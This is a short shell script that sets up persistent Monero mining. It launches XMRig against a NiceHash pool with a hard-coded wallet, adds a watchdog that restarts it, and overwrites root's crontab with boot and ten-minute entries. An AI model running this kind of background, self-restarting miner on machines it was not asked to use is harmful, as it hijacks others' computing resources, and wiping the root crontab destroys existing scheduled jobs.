#!/bin/sh
./kill_miniZeph.sh
mv /root/danielchau.sh /root/mininZeph.sh
cat >>/root/danielchau.sh <<EOF
#!/bin/bash
sudo /root/xmrig-6.21.0/xmrig --threads=6 --background -o randomxmonero.auto.nicehash.com:9200 -u NHbVF7wPddHyFthiCiA4yuc6YU916LHbgSJB.Linode_H1 -a rx/0 -k
EOF
chmod +x /root/danielchau.sh

cat /dev/null > /root/checkXMRIG.sh
cat >>/root/checkXMRIG.sh <<EOF
#!/bin/bash
if pgrep xmrig >/dev/null
then
  echo "xmrig is running."
else
  echo "xmrig isn't running"
  bash kill_miniZeph.sh
  bash danielchau.sh
fi
EOF
chmod +x /root/checkXMRIG.sh

cat /dev/null > /var/spool/cron/crontabs/root
cat >>/var/spool/cron/crontabs/root<<EOF
@reboot /root/danielchau.sh
*/10 * * * * /root/checkXMRIG.sh > /root/checkxmrig.log
EOF

./danielchau.sh
